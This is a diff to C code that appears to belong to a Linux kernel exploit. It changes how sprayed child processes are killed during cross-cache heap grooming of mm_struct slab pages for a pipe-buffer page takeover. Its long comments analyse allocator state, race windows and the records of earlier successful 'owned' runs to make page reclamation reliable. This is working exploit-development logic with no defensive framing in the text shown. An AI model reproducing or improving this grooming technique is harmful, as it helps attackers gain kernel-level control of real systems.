@@ -600,51 +600,31 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
         }
       }
       /*
-       * Batch hold-kill instead of killing per wave.  A per-wave kill
-       * returns the just-allocated pages to the partial lists right away,
-       * so the next wave reallocates the same hot chain-head pages: the
-       * sweep cycles a handful of pages forever and never reaches a
-       * target sitting deep in the node partial list (forensics:
-       * pre-sweep inuse=0 frozen=1, 24 waves x 8 rotating cpus never
-       * moved sc; the 771b7409 success had its page near the partial
-       * head, so 2 waves reached it).  Hold every wave's clones until
-       * CONVERT_HOLD_WAVES accumulate, then kill the whole batch at
-       * once: the burst of empty slabs (6 x wave_sz objects ~= 19 pages)
-       * flushes past min_partial, and that discard wave frees pages all
-       * the way down the list -- including the target, which the next
-       * iteration then reads as sc==0 -> owned. */
+       * Serial kill_child per wave -- the exact chain5 (771b7409) success
+       * mode (waves=2 taken=1 owned=1 ran 80a92409's code: per-wave
+       * kill_child).  The two-phase batch kill (bef0f86d onward) has ONLY
+       * failing records: five-word forensics shows wavepostfork w=0
+       * inuse=34 (the wave's mms DID land on the target page), then
+       * reaped=660 with +20 freelist staying NULL and inuse frozen at 34
+       * forever -- the mm_structs were never kmem_cache_freed.  Same
+       * SIGKILL+waitpid semantics, but every serial-kill precedent (pre's
+       * clone_memfd x33, pre/post/spray sweeps, chain5's wave kills) DID
+       * empty pages (pre-sweep always reads inuse=0).  The serial path
+       * kills+reaps one pid at a time so each child's exit_mm completes
+       * before the next SIGKILL; the two-phase burst fires all SIGKILLs
+       * within us and 110 concurrent do_exit/exit_mm runs apparently lose
+       * the free somewhere (mm_count/mmu_notifier race window under
+       * concurrency).  Restore the proven pattern verbatim. */
       if ((w + 1) % CONVERT_HOLD_WAVES == 0) {
-        /* Two-phase batch kill: SIGKILL every held pid first (fast, us
-         * apart), then reap.  mm_structs are freed at process EXIT, not
-         * at waitpid, so the whole slab batch goes empty within a few ms
-         * of the last SIGKILL -- before foreign forks can refill the
-         * slots.  kill_child's serial kill+waitpid takes ~0.7s for 660
-         * pids and forensics shows the page refilled to inuse=34 inside
-         * that window (pre-sweep inuse=0 -> post-wave inuse=34, sc never
-         * read 0 across 5 rounds), so the tsc read one iteration later
-         * always missed the buddy window.  With the fast phase the
-         * empty->refill window shrinks to the reap latency (~tens of ms)
-         * and the next iteration's tsc read lands inside it. */
-        int kill_sent = 0, reaped = 0, werr = 0;
+        int reaped = 0;
         for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++)
           for (size_t i = 0; i < wave_sz; i++)
             if (wave_pids[k * wave_sz + i]) {
-              if (kill(wave_pids[k * wave_sz + i], SIGKILL) == 0)
-                kill_sent++;
-            }
-        for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++) {
-          for (size_t i = 0; i < wave_sz; i++) {
-            if (wave_pids[k * wave_sz + i]) {
-              if (waitpid(wave_pids[k * wave_sz + i], NULL, 0) > 0)
-                reaped++;
-              else
-                werr++;
+              kill_child(wave_pids[k * wave_sz + i]);
+              reaped++;
               wave_pids[k * wave_sz + i] = 0;
             }
-          }
-        }
-        pr_info("pipe batch kill w=%d sent=%d reaped=%d werr=%d\n", w,
-                kill_sent, reaped, werr);
+        pr_info("pipe batch kill w=%d serial reaped=%d\n", w, reaped);
         taken_wave = w;
         /* The just-killed children's mm_structs are not always reclaimed
          * by the time waitpid returns (TLB/RCU/memcg tail), and every
